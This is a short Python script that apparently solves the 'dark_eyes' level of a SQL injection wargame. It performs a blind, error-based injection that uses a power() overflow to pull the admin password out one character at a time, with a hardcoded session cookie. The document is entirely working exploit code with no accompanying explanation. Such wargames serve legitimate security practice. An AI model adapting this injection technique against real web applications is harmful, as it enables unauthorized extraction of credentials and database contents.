#!/usr/bin/python
import requests
import re


cookie = {'PHPSESSID': 'mofdmvdl33bu5cpts0mhrkge87'}

url = "https://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw='"

cmp = "dark_eyes"

dbname=""

#Password is
for i in range(1, 10):
    for j in range(40, 125):
        query = url + " or (id= 'admin' and power((ascii(substr(pw," + str(i) + ",1)) = " + str(j) +")%2B 1,222222))-- -"
        req = requests.get(query, cookies=cookie)
        res=req.text
        tmp = re.findall(cmp, res)
        if not tmp:
            dbname += chr(j)
            break
        print str(j)
print "Password is : " + dbname
    
    





